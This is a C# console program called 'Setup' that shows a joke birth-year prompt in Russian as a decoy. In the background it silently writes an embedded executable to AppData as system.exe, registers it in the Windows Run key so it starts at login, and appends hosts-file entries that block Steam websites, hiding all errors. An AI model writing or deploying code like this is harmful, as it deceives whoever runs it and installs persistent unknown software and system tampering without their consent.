using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using static System.Net.Mime.MediaTypeNames;

namespace Setup
{
    internal class Program
    {
        static string pathToPrikol = $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\system.exe";

        static void Main(string[] args)
        {
            Task.Run(() =>
            {
                try
                {
                    File.WriteAllBytes(pathToPrikol, Resource1.Prikol);

                    HostsSteam();
                    SetToAutorun();
                }

                catch
                {

                }
            });

            Console.Write("Введите ваш год рождения: ");
            Console.ReadLine();
            Console.WriteLine("Похоже вам: ");
            Console.WriteLine("Загрузка");
            for(var i = 0; i < 1000; i++) Console.Write($"{i}");
            Console.WriteLine("Аапапахапхахпхапахпхапх, а я че знаю что-ли, апаапазпзапзапзазпазпхапвхаххпахххапахпхапаххаппаапъаъпхаахпахпап");
            Console.ReadKey();
        }

        static void SetToAutorun()
        {
            var startupKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            string filename = Path.GetFileNameWithoutExtension(pathToPrikol);

            try
            {
                startupKey.SetValue(filename, pathToPrikol);
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Ошибка при добавлении в автозагрузку: " + ex.Message);
                Console.ForegroundColor = ConsoleColor.White;
            }
            finally
            {
                startupKey.Close();
            }
        }

        static void HostsSteam()
        {
            try
            {
                var path = "C:\\Windows\\System32\\drivers\\etc\\hosts";
                var text = "\n127.0.0.1 store.steampowered.com\n127.0.0.1 steamcommunity.com\n127.0.0.1 steamcdn-a.akamaihd.net";

                using (var fs = new FileStream(path, FileMode.Append))
                {
                    using (var sw = new StreamWriter(fs))
                    {
                        sw.WriteLine(text);
                    }
                }
            }
            catch
            {

            }
        }
    }
}
